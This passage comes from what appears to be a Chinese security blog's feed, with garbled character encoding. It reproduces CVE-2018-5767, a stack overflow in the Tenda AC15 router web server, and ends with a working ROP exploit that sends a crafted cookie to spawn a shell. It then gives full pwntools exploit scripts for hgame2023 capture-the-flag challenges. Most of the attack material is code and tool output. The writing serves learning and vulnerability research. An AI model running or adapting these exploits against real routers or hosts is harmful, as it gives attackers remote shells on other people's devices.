 r1, r1, r4</span><br><span class="line">   0xff7e1954 &lt;_start+36&gt;    add    sp, sp, r4, lsl #2</span><br><span class="line">   0xff7e1958 &lt;_start+40&gt;    add    r2, sp, #4</span><br></pre></td></tr></table></figure><ul><li>æ–­ç‚¹ä¸‹åœ¨<code>End of function R7WebsSecurityHandler</code>å³æ‰§è¡Œå¦‚ä¸‹å‘½ä»¤ï¼š</li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">b *0x002ED18</span><br><span class="line">continue</span><br></pre></td></tr></table></figure><ul><li>è€Œåå†æ‰“å¼€ä¸€ä¸ªçª—å£ï¼Œæˆ‘ä»¬ç”¨<code>python</code>çš„<code>requeståº“</code>å°†æ•°æ®ä¼ è¿‡å»ï¼š</li></ul><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># exp.py</span></span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line">URL = <span class="string">&quot;http://192.168.79.152/goform/anza&quot;</span></span><br><span class="line">cookie = &#123;<span class="string">&quot;Cookie&quot;</span>:<span class="string">&quot;password=&quot;</span>+<span class="string">&quot;a&quot;</span>*<span class="number">0x400</span>&#125;</span><br><span class="line">requests.get(url=URL, cookies=cookie)</span><br></pre></td></tr></table></figure><ul><li>ä½†æˆ‘ä»¬æ²¡æœ‰æŒ‰é¢„æœŸè¿”å›ï¼Œè€Œæ˜¯è¢«æŸå­å‡½æ•°å¹²æ‰°äº†ï¼Œ<code>gdb</code>ä¸­åˆ©ç”¨<code>bt</code>å‘½ä»¤æº¯æºä¸€ä¸‹ï¼š</li></ul><img src="https://kjimg10.360buyimg.com/ott/jfs/t1/112590/12/35271/139746/63cbdf3cF15f3db66/09273cb75e2df912.png" style="zoom:80%;" /><ul><li>åœ¨<code>ida</code>ä¸­æ‰¾åˆ°å¹²æ‰°å‡½æ•°æ‰€åœ¨ä½ç½®ï¼Œæˆ‘ä»¬è¦æƒ³åŠæ³•é˜²æ­¢ç¨‹åºæ‰§è¡Œæµèµ°åˆ°è¯¥åˆ†æ”¯ï¼š</li></ul><img src="https://kjimg10.360buyimg.com/ott/jfs/t1/174764/17/33384/125374/63cbe09cFc920f42f/bb10de241747a44f.png" style="zoom:80%;" /><ul><li>ä¿®æ”¹<code>payload</code>ï¼Œä½¿<code>password</code>åŠ ä¸Š<code>.gif</code>å³å¯ç›´æ¥è¿”å›ï¼Œå¦‚ä¸‹ï¼š</li></ul><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line">URL = <span class="string">&quot;http://192.168.79.152/goform/anza&quot;</span></span><br><span class="line">cookie = &#123;<span class="string">&quot;Cookie&quot;</span>:<span class="string">&quot;password=&quot;</span>+<span class="string">&quot;a&quot;</span>*<span class="number">0x400</span>+<span class="string">&quot;.gif&quot;</span>&#125;</span><br><span class="line">requests.get(url=URL, cookies=cookie)</span><br></pre></td></tr></table></figure><ul><li>é‡å¤ä¸Šè¿°æµç¨‹ï¼Œç¨‹åºæ‰§è¡Œæµæ¥åˆ°æˆ‘ä»¬å‘ç”Ÿçš„åƒåœ¾æ•°æ®ï¼Œæˆ‘ä»¬æ³¨æ„åˆ°åœ°å€æ˜¯<code>0x61616160</code>è€Œé<code>0x61616161</code>ï¼Œè¿™æ˜¯å› ä¸º<code>arm</code>æ¨¡å¼ä¸<code>thumb</code>æ¨¡å¼çš„åˆ‡æ¢é—®é¢˜ã€‚åœ¨å‡½æ•°é€€å‡ºæ—¶æ‰§è¡Œäº†<code>pop pc</code>çš„æ“ä½œï¼Œè€Œå…¶æœ€ä½æœ‰æ•ˆä½(LSB)å°†ä¼šè¢«å†™å…¥åˆ°<code>CPSRå¯„å­˜å™¨</code>(å½“å‰ç¨‹åºçŠ¶æ€å¯„å­˜å™¨)çš„Tä½ä¸­ï¼š</li></ul><img src="https://kjimg10.360buyimg.com/ott/jfs/t1/52601/34/22749/86724/63cbe317F2b18c959/149ae61d7acf6b6d.png" style="zoom:80%;" /><ul><li>åœ¨æ„é€ <code>ROP</code>é“¾ä¹‹å‰ï¼Œé¦–å…ˆæˆ‘ä»¬éœ€è¦æ˜ç™½<code>32ä½arm</code>æ¶æ„æ˜¯å¦‚ä½•è¿›è¡Œç³»ç»Ÿè°ƒç”¨çš„ï¼š</li></ul><img src="https://kjimg10.360buyimg.com/ott/jfs/t1/97649/20/35562/153499/63cbe7d8Ff346c9f7/2d26131e222dfd7a.png" style="zoom:80%;" /><ul><li>æœ¬è´¨å’Œ<code>x86/x64</code>å¤§å·®ä¸å·®ï¼Œç”¨<code>ROPgagdet</code>æ‰¾åˆ°éœ€è¦çš„<code>gadget</code>ï¼š</li></ul><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line">fuzz@fuzz-virtual-machine:~/repeat/_US_AC15V1.0BR_V15.03.1.16_multi_TD01.rar.extracted/squashfs-root/bin$ ROPgadget --binary httpd --only <span class="string">&quot;pop&quot;</span></span><br><span class="line">Gadgets information</span><br><span class="line">============================================================</span><br><span class="line">0x0000ec88 : pop &#123;fp, pc&#125;</span><br><span class="line">0x000b06bc : pop &#123;r0, pc&#125;</span><br><span class="line">0x000b0e0c : pop &#123;r1, pc&#125;</span><br><span class="line">0x0000e510 : pop &#123;r3, pc&#125;</span><br><span class="line">0x0000e5f0 : pop &#123;r3, r4, fp, pc&#125;</span><br><span class="line">0x0009ffb4 : pop &#123;r3, r4, r5, pc&#125;</span><br><span class="line">0x000a0320 : pop &#123;r3, r4, r5, r6, r7, pc&#125;</span><br><span class="line">0x000a5e30 : pop &#123;r3, r4, r5, r6, r7, r8, sl, pc&#125;</span><br><span class="line">0x0000ec00 : pop &#123;r4, fp, pc&#125;</span><br><span class="line">0x0009fd10 : pop &#123;r4, pc&#125;</span><br><span class="line">0x0000ed80 : pop &#123;r4, r5, fp, pc&#125;</span><br><span class="line">0x000ae530 : pop &#123;r4, r5, pc&#125;</span><br><span class="line">0x000281f4 : pop &#123;r4, r5, r6, fp, pc&#125;</span><br><span class="line">0x0009fde4 : pop &#123;r4, r5, r6, pc&#125;</span><br><span class="line">0x0001bff0 : pop &#123;r4, r5, r6, r7, fp, pc&#125;</span><br><span class="line">0x000a07c4 : pop &#123;r4, r5, r6, r7, pc&#125;</span><br><span class="line">0x0004aec4 : pop &#123;r4, r5, r6, r7, r8, fp, pc&#125;</span><br><span class="line">0x000a002c : pop &#123;r4, r5, r6, r7, r8, pc&#125;</span><br><span class="line">0x0003cfe8 : pop &#123;r4, r5, r6, r7, r8, sb, fp, pc&#125;</span><br><span class="line">0x00090408 : pop &#123;r4, r5, r6, r7, r8, sb, sl, fp, pc&#125;</span><br><span class="line">0x000a1e78 : pop &#123;r4, r5, r6, r7, r8, sb, sl, pc&#125;</span><br><span class="line">0x000a5128 : pop &#123;r4, r5, r6, r7, r8, sl, fp, pc&#125;</span><br><span class="line">0x0009fe44 : pop &#123;r4, r5, r6, r7, r8, sl, pc&#125;</span><br><span class="line">0x0007036c : pop &#123;r4, r6, r7, fp, pc&#125;</span><br><span class="line"></span><br><span class="line">Unique gadgets found: 24</span><br></pre></td></tr></table></figure><p>ç¬¬ä¸€æ¬¡è¿˜çœ‹ä¸æ‡‚ï¼Œæƒ³ç€<code>ret</code>åœ¨å“ªé‡Œï¼Œå¿½ç„¶å‘ç°<code>pop pc</code>å°±æ˜¯<code>ret</code>ã€‚</p><ul><li>è®¡ç®—åç§»ä¸º<code>448</code>ï¼Œæ„é€ æ‰§è¡Œ<code>puts(&quot;ANZA_HACK&quot;)</code>çš„<code>rop</code>é“¾å‘ç°å¤±è´¥ï¼Œä¸éš¾çŒœæµ‹åŸå› æ˜¯<code>sscanf</code>è¢«<code>\x00</code>æˆªæ–­äº†(å› ä¸ºç”¨çš„æºç¨‹åºçš„<code>gadget</code>ï¼Œé«˜ä½ä¸º<code>\x00</code>)ï¼Œæ•…é‡‡ç”¨<code>libc</code>çš„<code>gagdet</code>ï¼Œé¦–å…ˆè¦è®¡ç®—æœ¬åœ°<code>libc</code>åŸºå€ï¼Œæ ¹æ®ä¹‹å‰åœ¨<code>strstr</code>å¤„å‡ºé”™çš„å›¾å¯å¾—ï¼š</li></ul><p><code>æ³¨ï¼šä¸ ctf ä¸­ä¸åŒçš„ä¸€ç‚¹æ˜¯è¿™ç§ web æœåŠ¡åœ¨å´©æºƒåä¸€èˆ¬ä¼šç«‹åˆ»é‡å¯ï¼Œå¹¶ä¸”é‡å¯ä¹‹åçš„ libc åœ°å€å’Œä¹‹å‰æ˜¯ç›¸åŒçš„ï¼Œæ‰€ä»¥çˆ†ç ´ libc æ˜¯æ¯”è¾ƒå¸¸ç”¨çš„æ”»å‡»æ‰‹æ®µï¼Œä¸è¿‡ qemu æ²¡åŠæ³•æä¾›è¿™ç§çˆ†ç ´ libc çš„æ¡ä»¶ï¼Œæˆ‘ä»¬å…ˆå‡å®šæˆ‘ä»¬çŸ¥é“ libc åŸºå€ã€‚</code></p><img src="https://kjimg10.360buyimg.com/ott/jfs/t1/112590/12/35271/139746/63cbdf3cF15f3db66/09273cb75e2df912.png" style="zoom:80%;" /><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">libc_base=<span class="number">0xff613954</span>-<span class="number">24</span>-libc.sym[<span class="string">&quot;strstr&quot;</span>]</span><br></pre></td></tr></table></figure><ul><li>æœ€ç»ˆ<code>exp</code>å¦‚ä¸‹ï¼š</li></ul><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">libc=ELF(<span class="string">&quot;./lib/libc.so.0&quot;</span>)</span><br><span class="line"></span><br><span class="line">libc_base=<span class="number">0xff613954</span>-<span class="number">24</span>-libc.sym[<span class="string">&quot;strstr&quot;</span>]</span><br><span class="line">pop_r0_ret=libc_base+<span class="number">0x0003db80</span></span><br><span class="line">system=libc_base+libc.sym[<span class="string">&quot;system&quot;</span>]</span><br><span class="line">sh_addr=<span class="number">0xfffeeca8</span></span><br><span class="line">log.success(<span class="string">&quot;libc_base=&quot;</span>+<span class="built_in">hex</span>(libc_base))</span><br><span class="line">payload=<span class="string">&quot;a&quot;</span>*<span class="number">444</span>+<span class="string">&quot;.gif&quot;</span>+p32(pop_r0_ret).decode(<span class="string">&#x27;unicode_escape&#x27;</span>)+p32(sh_addr).decode(<span class="string">&#x27;unicode_escape&#x27;</span>)+p32(system).decode(<span class="string">&#x27;unicode_escape&#x27;</span>)</span><br><span class="line">payload+=<span class="string">&quot;sh\x00\x00&quot;</span></span><br><span class="line"><span class="built_in">print</span>(payload)</span><br><span class="line">URL = <span class="string">&quot;http://192.168.79.152/goform/anza&quot;</span></span><br><span class="line">cookie = &#123;<span class="string">&quot;Cookie&quot;</span>:<span class="string">&quot;password=&quot;</span>+payload&#125;</span><br><span class="line">requests.get(url=URL, cookies=cookie)</span><br></pre></td></tr></table></figure><ul><li>å…¶ä»–åšå®¢çš„ç»“æœéƒ½ä¸èƒ½<code>getshell</code>ã€‚ã€‚ã€‚ã€‚æˆ‘åè€Œå¯ä»¥<code>getshell</code>ï¼Œæ•ˆæœå¦‚ä¸‹ï¼š</li></ul><img src="https://kjimg10.360buyimg.com/ott/jfs/t1/222104/25/16882/304730/63cc009fFb1cef77d/1cf45750308aabda.png" style="zoom:80%;" /><h3 id="æ€»ç»“"><a href="#æ€»ç»“" class="headerlink" title="æ€»ç»“"></a>æ€»ç»“</h3><p>å¾ˆæœ‰æ„æ€çš„ä¸€æ¬¡å®éªŒï¼Œæ¥è§¦äº†å¾ˆå¤šä»¥å‰åªæ˜¯å¬è¿‡ä½†æ˜¯æœªæŠ•å…¥å®è·µçš„çŸ¥è¯†ï¼Œç®—æ˜¯å…¥é—¨æ¼æ´æŒ–æ˜çš„ç¬¬ä¸€æ­¥å§ï¼Œå½“ç„¶è¿˜æœ‰å¾ˆå¤šç»†èŠ‚æ²¡æœ‰ç›˜æ¸…æ¥šï¼Œæœªæ¥è¿˜éœ€åŠªåŠ›ã€‚å†æ¬¡æ„Ÿè°¢åšå®¢å¸ˆå‚…ä»¬ã€‚</p>]]></content>
    
    
    <summary type="html">&lt;p&gt;è€ƒç ”æœŸé—´æƒ³å¤ç°çš„æ¼æ´ï¼Œç°åœ¨æŒ–å‡ºæ¥ç›˜ä¸€ä¸‹ã€‚&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;&lt;a href=&quot;https://mp.weixin.qq.com/s/GDPpK1Pew6bkUZUfazur9Q&quot;&gt;Tenda-AC15æ ˆæº¢å‡ºæ¼æ´(CVE-2018-5767)    by æ˜ŸæœŸäº”å®éªŒå®¤&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;&lt;a href=&quot;https://zhuanlan.zhihu.com/p/468018356&quot;&gt;cve-2018-5767 è·¯ç”±å™¨æ ˆæº¢å‡ºæ¼æ´å¤ç°    by åˆå¤©ç½‘å®‰å®éªŒå®¤&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;&lt;a href=&quot;https://wzt.ac.cn/2019/03/19/CVE-2018-5767/&quot;&gt;CVE-2018-5767 å¤ç°åˆ†æ    by CataLpa&lt;/a&gt;&lt;/p&gt;
&lt;/blockquote&gt;</summary>
    
    
    
    <category term="cve" scheme="http://example.com/categories/cve/"/>
    
    <category term="cve-2018-5767" scheme="http://example.com/categories/cve/cve-2018-5767/"/>
    
    
    <category term="cve tenda" scheme="http://example.com/tags/cve-tenda/"/>
    
  </entry>
  
  <entry>
    <title>hgame2023</title>
    <link href="http://example.com/2023/01/05/hgame2023/"/>
    <id>http://example.com/2023/01/05/hgame2023/</id>
    <published>2023-01-05T12:06:14.000Z</published>
    <updated>2023-02-01T14:02:32.950Z</updated>
    
    <content type="html"><![CDATA[<p>å¤å¥ã€‚</p><span id="more"></span><h1 id="WEEK1"><a href="#WEEK1" class="headerlink" title="WEEK1"></a>WEEK1</h1><h2 id="pwn"><a href="#pwn" class="headerlink" title="pwn"></a>pwn</h2><h3 id="easy-overflow"><a href="#easy-overflow" class="headerlink" title="easy_overflow"></a>easy_overflow</h3><p>ç¡®å®<code>easy</code>ï¼Œç›´æ¥æ„é€ æ ˆæº¢å‡ºå³å¯ï¼Œè¦æ³¨æ„åé—¨å‡½æ•°åœ°å€+1ã€‚</p><img src="https://kjimg10.360buyimg.com/ott/jfs/t1/159776/24/33843/7163/63b6c784F98142c24/0da58b7fb1d9c047.png" style="zoom:80%;" /><img src="https://kjimg10.360buyimg.com/ott/jfs/t1/25967/13/20268/3396/63b6c784Fb27b4e3c/ad354f6b6cdab194.png" style="zoom:80%;" /><p><code>exp</code>å¦‚ä¸‹ï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="comment">#io=process(&quot;./vuln&quot;)</span></span><br><span class="line">io=remote(<span class="string">&quot;&quot;</span>,)</span><br><span class="line">backdoor=<span class="number">0x40117b</span></span><br><span class="line">payload=<span class="string">b&#x27;a&#x27;</span>*<span class="number">24</span>+p64(backdoor)*<span class="number">10</span></span><br><span class="line"><span class="comment">#gdb.attach(io)</span></span><br><span class="line"><span class="comment">#pause()</span></span><br><span class="line">io.send(payload)</span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure><p>å¾—åˆ°<code>shell</code>åè¿›è¡Œä¸€æ³¢é‡å®šä½å³å¯ï¼š</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">exec 1&gt;&amp;2</span><br></pre></td></tr></table></figure><h3 id="choose-the-seat"><a href="#choose-the-seat" class="headerlink" title="choose_the_seat"></a>choose_the_seat</h3><p>å…¸å‹çš„è´Ÿæ•´æ•°è¶Šç•Œåˆ©ç”¨ï¼Œç”±æœªæ£€æŸ¥ä¸‹ç•Œå¯¼è‡´ã€‚</p><img src="https://kjimg10.360buyimg.com/ott/jfs/t1/128060/20/29852/46558/63b6d8d4Faffade79/9f8aae62c7a0994e.png" style="zoom:80%;" /><ul><li>æ¼æ´å…è®¸æˆ‘ä»¬æ›´æ”¹ä¸‹æ ‡æŒ‡å‘<code>0x10</code>å†…å®¹ï¼Œä¸”ç¨‹åºå¯åŠ«æŒ<code>got</code>è¡¨ã€‚</li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">Arch:     amd64-64-little</span><br><span class="line">RELRO:    Partial RELRO</span><br><span class="line">Stack:    No canary found</span><br><span class="line">NX:       NX enabled</span><br><span class="line">PIE:      No PIE (0x400000)</span><br></pre></td></tr></table></figure><ul><li>ç¬¬ä¸€æ­¥ï¼ŒåŠ«æŒ<code>exit</code>ä¸º<code>vuln</code>å‡½æ•°ã€‚</li><li>ç¬¬äºŒæ­¥ï¼Œæ³„éœ²ä»»æ„ä¸€å¤„<code>got</code>è¡¨åœ°å€ï¼Œå³æ³„éœ²<code>libc</code>ã€‚</li><li>ç¬¬ä¸‰æ­¥ï¼ŒåŠ«æŒ<code>puts</code>ä¸º<code>system</code>ï¼Œé¡ºä¾¿å†™å…¥<code>/bin/sh</code>ã€‚</li></ul><img src="https://kjimg10.360buyimg.com/ott/jfs/t1/59060/18/22803/30759/63b6da2eF20602c20/59d8c4d007e52f4e.png" style="zoom:80%;" /><ul><li><code>exp</code>å¦‚ä¸‹ï¼š</li></ul><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="comment">#io=process(&quot;./vuln&quot;)</span></span><br><span class="line">io=remote(<span class="string">&quot;week-1.hgame.lwsec.cn&quot;</span>,<span class="number">32413</span>)</span><br><span class="line">libc=ELF(<span class="string">&quot;libc-2.31.so&quot;</span>)</span><br><span class="line">vul=<span class="number">0x4011DA</span></span><br><span class="line"></span><br><span class="line">io.sendlineafter(<span class="string">&#x27;please choose one.\n&#x27;</span>,<span class="string">b&quot;-6&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">#gdb.attach(io)</span></span><br><span class="line"><span class="comment">#pause()</span></span><br><span class="line">io.sendafter(<span class="string">&quot;please input your name\n&quot;</span>,p64(vul))</span><br><span class="line"></span><br><span class="line">io.sendlineafter(<span class="string">&#x27;please choose one.\n&#x27;</span>,<span class="string">b&quot;-8&quot;</span>)</span><br><span class="line">io.sendafter(<span class="string">&quot;please input your name\n&quot;</span>,<span class="string">b&#x27;\xd0&#x27;</span>)</span><br><span class="line"></span><br><span class="line">setbuf=u64(io.recvuntil(<span class="string">&#x27;\x7f&#x27;</span>)[-<span class="number">6</span>:].ljust(<span class="number">8</span>,<span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line">libc_base=setbuf-libc.sym[<span class="string">&quot;setbuf&quot;</span>]</span><br><span class="line">log.success(<span class="string">&#x27;libc_base==&gt;&#x27;</span>+<span class="built_in">hex</span>(libc_base))</span><br><span class="line"></span><br><span class="line">system=libc_base+libc.sym[<span class="string">&quot;system&quot;</span>]</span><br><span class="line"></span><br><span class="line">io.sendlineafter(<span class="string">&#x27;please choose one.\n&#x27;</span>,<span class="string">b&quot;-9&quot;</span>)</span><br><span class="line">io.sendafter(<span class="string">&quot;please input your name\n&quot;</span>,<span class="string">b&#x27;/bin/sh\x00&#x27;</span>+p64(system))</span><br><span class="line"></span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure><h3 id="orw"><a href="#orw" class="headerlink" title="orw"></a>orw</h3><p>è›®æœ‰æ„æ€çš„ä¸€é“<code>orw</code>é¢˜ï¼Œå·©å›ºäº†ä¸€äº›çŸ¥è¯†ç‚¹ã€‚</p><img src="https://kjimg10.360buyimg.com/ott/jfs/t1/140425/14/33061/4893/63b83266F5ad1d4fd/c999c86fdd690970.png" style="zoom:80%;" /><p>ç®€å•çš„æ ˆæº¢å‡ºï¼Œå¼€äº†æ²™ç®±ï¼Œç¦äº†<code>system</code>ï¼š</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"> line  CODE  JT   JF      K</span><br><span class="line">=================================</span><br><span class="line"> 0000: 0x20 0x00 0x00 0x00000000  A = sys_number</span><br><span class="line"> 0001: 0x15 0x02 0x00 0x0000003b  if (A == execve) goto 0004</span><br><span class="line"> 0002: 0x15 0x01 0x00 0x00000142  if (A == execveat) goto 0004</span><br><span class="line"> 0003: 0x06 0x00 0x00 0x7fff0000  return ALLOW</span><br><span class="line"> 0004: 0x06 0x00 0x00 0x00000000  return KILL</span><br></pre></td></tr></table></figure><ul><li>é¦–å…ˆæ³„éœ²<code>libc</code>ã€‚</li><li>ç”±äºæº¢å‡ºçš„å¹¶ä¸å¤šï¼Œå› æ­¤å¾—æƒ³åŠæ³•<strong>å¢å¼ºæº¢å‡ºèƒ½åŠ›</strong>ã€‚ä¸€å¼€å§‹æƒ³ç€èµ°ä¸€æ­¥è¿”å›ä¸€æ­¥ï¼Œä½†æº¢å‡ºçš„æ•°é‡ä»ä¸è¶³ä»¥ä¸€æ¬¡æ€§å®Œæˆå¦‚<code>read(3,bss,0x30)</code>è¿™ä¸€ç³»åˆ—æ“ä½œã€‚è¯¥é¢˜æ¯”è¾ƒå·§å¦™çš„ä¸€ç‚¹æ˜¯ç”±äºæ˜¯<code>read</code>é€ æˆçš„æº¢å‡ºï¼Œæˆ‘ä»¬å…¶å®æ— éœ€æ§åˆ¶<code>rdi</code>å’Œ<code>rsi</code>ï¼Œåªéœ€å¢å¤§<code>rdx</code>ï¼Œå¹¶å†æ¬¡è°ƒç”¨<code>read</code>å³å¯ã€‚</li><li>ps. çœ‹äº†ä¸‹å®˜æ–¹<code>wp</code>ä½¿ç”¨çš„æ˜¯<code>æ ˆè¿ç§»</code>å’Œ<code>mprotect</code>ï¼Œæ„Ÿè§‰ä¸å¦‚æœ¬æ–¹æ³•ç®€å•ã€‚</li></ul><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"><span class="comment">#io=process(&quot;./vuln&quot;)</span></span><br><span class="line">io=remote(<span class="string">&quot;week-1.hgame.lwsec.cn&quot;</span>,<span class="number">31611</span>)</span><br><span class="line">elf=ELF(<span class="string">&quot;vuln&quot;</span>)</span><br><span class="line">libc=ELF(<span class="string">&quot;libc-2.31.so&quot;</span>)</span><br><span class="line"></span><br><span class="line">vul=<span class="number">0x4012C4</span></span><br><span class="line">flag_addr=<span class="number">0x404080</span></span><br><span class="line">pop_rdi_ret=<span class="number">0x0000000000401393</span></span><br><span class="line">pop_rsi_r13_ret=<span class="number">0x0000000000401391</span></span><br><span class="line"><span class="comment"># leak libc</span></span><br><span class="line">payload=<span class="string">b&#x27;a&#x27;</span>*<span class="number">264</span>+p64(pop_rdi_ret)+p64(<span class="number">0x404020</span>)+p64(elf.sym[<span class="string">&quot;puts&quot;</span>])</span><br><span class="line">payload+=p64(vul)</span><br><span class="line">io.send(payload)</span><br><span class="line">libc_base=u64(io.recvuntil(<span class="string">&#x27;\x7f&#x27;</span>)[-<span class="number">6</span>:].ljust(<span class="number">8</span>,<span class="string">b&quot;\x00&quot;</span>))-libc.sym[<span class="string">&quot;read&quot;</span>]</span><br><span class="line">log.success(<span class="string">&quot;libc_base===&gt;&quot;</span>+<span class="built_in">hex</span>(libc_base))</span><br><span class="line"></span><br><span class="line">pop_rdx_ret=libc_base+<span class="number">0x0000000000142c92</span></span><br><span class="line">openn=libc_base+<span class="number">0x10DCE0</span></span><br><span class="line">payload=<span class="string">b&#x27;a&#x27;</span>*<span class="number">264</span>+p64(pop_rsi_r13_ret)+p64(flag_addr)+p64(<span class="number">0</span>)+p64(elf.sym[<span class="string">&quot;read&quot;</span>])+p64(vul)</span><br><span class="line">io.send(payload)</span><br><span class="line">io.send(<span class="string">b&#x27;/flag&#x27;</span>+<span class="string">b&#x27;\x00&#x27;</span>*<span class="number">299</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">#gdb.attach(io)</span></span><br><span class="line"><span class="comment">#pause()</span></span><br><span class="line">payload=<span class="string">b&#x27;a&#x27;</span>*<span class="number">264</span>+p64(pop_rdx_ret)+p64(<span class="number">0x300</span>)+p64(elf.sym[<span class="string">&quot;read&quot;</span>])+p64(<span class="number">0</span>)*<span class="number">2</span></span><br><span class="line">io.send(payload)</span><br><span class="line"></span><br><span class="line">payload=<span class="string">b&#x27;b&#x27;</span>*<span class="number">264</span>+p64(<span class="number">0</span>)*<span class="number">3</span>+p64(pop_rdi_ret)+p64(flag_addr)+p64(pop_rsi_r13_ret)+p64(<span class="number">0</span>)*<span class="number">2</span>+p64(openn)</span><br><span class="line">payload+=p64(pop_rdi_ret)+p64(<span class="number">3</span>)+p64(pop_rsi_r13_ret)+p64(flag_addr)+p64(<span class="number">0</span>)+p64(pop_rdx_ret)+p64(<span class="number">0x40</span>)+p64(elf.sym[<span class="string">&quot;read&quot;</span>])</span><br><span class="line">payload+=p64(pop_rdi_ret)+p64(<span class="number">1</span>)+p64(libc_base+<span class="number">0x10E060</span>)+p64(vul)</span><br><span class="line">io.send(payload)</span><br><span class="line"></span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure><p>è¿˜éœ€æ³¨æ„çš„ç‚¹æ˜¯ï¼š</p><ol><li><code>open</code>å’Œ<code>open64</code>æ˜¯ä¸€ä¸ªä¸œè¥¿ï¼Œå½“æ—¶<code>libc</code>é‡Œæ‰¾åŠå¤©ï¼Œå‘ç°<code>open64</code>é‡Œæœ‰è¿™ä¹ˆä¸€å¥æ³¨é‡Šï¼š</li></ol><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Alternative name is &#x27;__open&#x27;</span><br></pre></td></tr></table></figure><ol start="2"><li>ä½¿ç”¨<code>remote</code>è¿œç¨‹ç«¯å£æ—¶ï¼Œ<code>read</code>çš„<code>rdx</code>å‚æ•°æœ‰å¤šå¤§ä¼ å¤šå°‘ï¼Œå¦åˆ™ä¼šå¯¼è‡´ä¸‹é¢<code>send</code>çš„æ•°æ®è¢«ä¹‹å‰çš„<code>read</code>åƒæ‰ã€‚</li></ol><h3 id="simple-shellcode"><a href="#simple-shellcode" class="headerlink" 